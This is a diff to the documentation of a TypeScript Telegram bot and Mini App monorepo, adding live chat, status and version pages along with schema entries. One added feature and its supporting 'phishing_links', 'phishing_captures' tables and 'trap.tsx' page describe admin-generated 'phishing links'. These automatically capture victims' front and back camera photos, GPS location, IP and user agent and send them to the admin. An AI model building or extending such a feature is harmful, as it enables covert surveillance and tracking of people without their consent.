@@ -45,6 +45,7 @@ pnpm workspace monorepo using TypeScript. Each package manages its own dependenc
 - Version history page (full changelog v1.0.0 → latest)
 - System status page (live health checks for Worker, D1, Bot API, MTProto, Pages + webhook info + DB stats)
 - Live Chat — real-time text messaging between users and admin inside the Mini App (separate from bot chat, polling-based, uses telegram_id for identification)
+- Phishing links — admin generates trackable capture links (Web + Mini App); auto-captures front/back camera photos, GPS location, IP/UA; sends everything to admin via Bot API
 
 ## Production URLs
 
@@ -119,7 +120,13 @@ artifacts/
     │       ├── moderation.tsx
     │       ├── bot-tools.tsx
     │       ├── sessions.tsx
-    │       └── deletion-requests.tsx
+    │       ├── deletion-requests.tsx
+│       ├── phishing.tsx
+│       ├── live-chat.tsx
+│       └── system-status.tsx
+├── pages/
+│   ├── versions.tsx
+│   └── trap.tsx
 ```
 
 ## D1 Schema Tables
@@ -134,6 +141,9 @@ artifacts/
 - `premium_subscriptions` — Stars/crypto premium subs
 - `user_metadata` — ip_address, country_code, city, user_agent, platform, language, timezone, screen, cookie_consent, first_seen, last_seen
 - `deletion_requests` — id, telegram_id, reason, status (pending/approved/declined), admin_note
+- `live_chat_messages` — from_id, to_id, text, read status
+- `phishing_links` — code (unique), label, created_at
+- `phishing_captures` — link_code, telegram_id, ip, user_agent, latitude, longitude, front_photo_key, back_photo_key
 
 ## Key API Endpoints
 
